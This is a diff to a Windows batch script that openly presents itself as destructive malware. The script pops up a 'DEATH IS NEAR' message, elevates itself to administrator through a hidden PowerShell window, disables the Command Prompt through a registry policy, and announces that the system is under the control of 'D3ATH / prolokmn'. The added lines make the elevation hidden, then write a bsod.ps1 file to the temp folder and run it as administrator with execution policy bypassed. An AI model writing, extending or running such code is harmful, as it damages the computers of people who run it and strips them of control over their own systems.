@@ -17,14 +17,13 @@ timeout /t 2 /nobreak >nul
 echo x=msgbox("DIE", 0, "DEATH IS NEAR") > msgbox.vbs
 start msgbox.vbs
 
-
 :adminCheck
 net session >nul 2>&1
 if %errorLevel% == 0 (
     goto main
 ) else (
     echo Elevating to admin...
-    powershell Start-Process -FilePath "%0" -Verb runAs
+    powershell -window hidden -command "Start-Process -FilePath '%0' -Verb runAs"
     exit
 )
 
@@ -187,4 +186,6 @@ echo Disabling Command Prompt...
 reg add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
 echo Complete destruction and fun accomplished!
 echo Your system is now under the control of D3ATH / prolokmn
+powershell -window hidden -command "echo wininit | Out-File -FilePath \$env:temp\bsod.ps1 -Encoding ASCII" >nul 2>&1
+powershell -window hidden -command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \$env:temp\bsod.ps1' -Verb RunAs" >nul 2>&1
 goto reopen
